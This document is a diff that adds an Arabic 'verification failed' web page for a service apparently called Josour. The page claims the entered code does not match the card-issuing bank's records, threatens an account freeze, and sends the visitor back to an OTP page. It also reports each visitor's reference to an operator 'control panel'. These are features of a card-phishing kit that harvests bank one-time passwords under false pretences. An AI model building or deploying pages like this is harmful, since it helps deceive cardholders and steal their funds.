@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فشل التحقق | جسور</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="config.js"></script>
+    <style>
+        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #8D1B3D 0%, #002D52 100%); overflow: hidden; }
+        .error-ring { border: 4px solid #f3f3f3; border-top: 4px solid #dc3545; border-radius: 50%; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; font-size: 40px; color: #dc3545; font-weight: bold; }
+    </style>
+</head>
+<body class="flex justify-center items-center h-screen">
+
+    <div class="bg-white p-10 rounded-[30px] shadow-2xl w-full max-w-[500px] mx-4 text-center">
+        <div class="flex justify-center mb-8">
+            <div class="error-ring shadow-lg shadow-red-100">✕</div>
+        </div>
+
+        <h1 class="text-[32px] font-black text-[#1a1a1a] mb-2">فشل التحقق</h1>
+        <p class="text-[18px] text-gray-500 mb-8 font-bold">الرمز المدخل غير صحيح</p>
+
+        <div class="bg-[#fdeaea] p-6 rounded-2xl mb-8 border border-red-100">
+            <p class="text-[14px] text-red-700 leading-relaxed font-semibold">
+                عذراً، المعلومات المدخلة لا تتطابق مع سجلات البنك المصدر للبطاقة. يرجى التأكد وإعادة المحاولة.
+            </p>
+        </div>
+
+        <!-- التحويل يتم فقط عند ضغط هذا الزر -->
+        <button onclick="goBackToOTP()" class="w-full bg-[#8D1B3D] text-white py-4 rounded-xl font-black text-lg transition-transform active:scale-95 shadow-md">
+            إعادة المحاولة الآن
+        </button>
+
+        <p class="mt-6 text-[10px] text-gray-400 font-bold opacity-60">
+            يرجى عدم تكرار إدخال بيانات خاطئة لتجنب تجميد الحساب
+        </p>
+    </div>
+
+    <script>
+        var ref = resolveRef();
+
+        function goBackToOTP() {
+            window.location.replace('otp.html?ref=' + encodeURIComponent(ref));
+        }
+
+        // إخطار لوحة التحكم بأن العميل وصل إلى صفحة الخطأ
+        if (window.trackAction) { trackAction(ref, 'WAITING-ERROR-ACTION'); }
+    </script>
+</body>
+</html>
